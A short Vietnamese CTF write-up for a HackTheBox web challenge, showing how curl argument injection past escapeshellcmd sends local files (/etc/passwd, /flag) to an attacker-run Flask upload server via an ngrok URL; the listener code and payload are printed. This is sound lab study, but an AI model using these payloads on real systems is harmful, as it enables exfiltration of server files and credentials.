![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/1.png)

bài này cũng không khó
ta thấy rằng web này có chức năng dùng lệnh __curl trong linux__ nhưng ta không thể thực hiện command injection vì hàm __escapeshellcmd($host)__ đã chặn.
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/3.png)
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/4.png)
<br />
nhưng  lệnh __curl__ có thể upload file đến một máy web khác bằng lệnh __curl -X POST -F file=@@/etc/passwd url_attacker__ 
<br />
trong tệp __Dockerfile__ ta có thể thấy đường dẫn __/flag__
<br />
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/Untitled.png)

ta chạy web để bắt file được gửi về
```from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods = [ 'POST'])
def upload_file():
    if request.method == 'POST':
      f = request.files['file']
      f.save(f.filename)
      return 'file uploaded successfully'

if __name__ == '__main__':
   app.run(host="0.0.0.0",port=8888)``` 
   
payload  ```http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/upload -X POST -F file=@/flag``` 
